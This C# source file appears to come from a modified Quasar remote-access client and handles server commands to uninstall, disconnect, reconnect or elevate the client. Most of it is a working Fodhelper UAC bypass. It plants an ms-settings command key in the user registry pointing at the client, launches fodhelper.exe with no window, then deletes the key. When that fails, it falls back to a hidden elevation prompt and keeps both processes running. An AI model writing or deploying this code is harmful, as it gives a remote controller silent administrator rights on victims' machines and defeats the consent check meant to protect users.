using Quasar.Client.Config;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly QuasarClient _client;

        private readonly QuasarApplication _application;

        public ClientServicesHandler(QuasarApplication application, QuasarClient client)
        {
            _application = application;
            _client = client;
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private async void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                // Try Fodhelper UAC bypass first (creates NEW elevated process)
                bool success = await RunFodhelperBypass(Application.ExecutablePath);
                
                if (success)
                {
                    client.Send(new SetStatus { Message = "Elevated process spawned via Fodhelper bypass. Both processes will remain running." });
                    // DO NOT EXIT - let both processes run
                    // The elevated process will automatically use a different mutex
                }
                else
                {
                    // Fallback to traditional UAC prompt if bypass fails
                    try
                    {
                        ProcessStartInfo processStartInfo = new ProcessStartInfo
                        {
                            FileName = Application.ExecutablePath,
                            Verb = "runas",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = true
                        };
                        
                        Process.Start(processStartInfo);
                        client.Send(new SetStatus { Message = "Elevated process spawned via UAC prompt. Both processes will remain running." });
                        // DO NOT EXIT - let both processes run
                    }
                    catch
                    {
                        client.Send(new SetStatus { Message = "Failed to elevate - UAC denied or bypass failed." });
                    }
                }
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already running with administrator privileges." });
            }
        }

        #region Fodhelper UAC Bypass

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            int dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        /// <summary>
        /// Attempts to elevate privileges using the Fodhelper UAC bypass technique
        /// </summary>
        private async Task<bool> RunFodhelperBypass(string path)
        {
            IntPtr wow64Value = IntPtr.Zero;
            bool worked = false;
            
            try
            {
                // Disable WOW64 file system redirection
                Wow64DisableWow64FsRedirection(ref wow64Value);
                
                // Check if UAC is set to always notify (bypass won't work)
                using (RegistryKey alwaysNotify = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    if (alwaysNotify != null)
                    {
                        string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin")?.ToString() ?? "0";
                        string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop")?.ToString() ?? "0";
                        
                        // If UAC is set to always notify, bypass won't work
                        if (consentPrompt == "2" && secureDesktopPrompt == "1")
                        {
                            return false;
                        }
                    }
                }

                // Set the registry key for fodhelper
                using (RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true))
                {
                    newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
                    
                    using (RegistryKey fodhelper = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true))
                    {
                        fodhelper.SetValue("DelegateExecute", "");
                        fodhelper.SetValue("", path);
                    }
                }

                // Launch fodhelper.exe which will execute our program with elevated privileges
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                
                worked = CreateProcess(
                    null,
                    "cmd /c start \"\" \"%windir%\\system32\\fodhelper.exe\"",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x08000000, // CREATE_NO_WINDOW
                    IntPtr.Zero,
                    null,
                    ref si,
                    ref pi);

                // Wait for the process to start
                await Task.Delay(2000);

                // Clean up the registry keys
                using (RegistryKey cleanupKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true))
                {
                    if (cleanupKey != null)
                    {
                        try
                        {
                            cleanupKey.DeleteSubKeyTree("ms-settings");
                        }
                        catch { }
                    }
                }
            }
            catch
            {
                worked = false;
            }
            finally
            {
                // Re-enable WOW64 file system redirection
                if (wow64Value != IntPtr.Zero)
                {
                    Wow64RevertWow64FsRedirection(wow64Value);
                }
            }

            return worked;
        }

        #endregion
    }
}
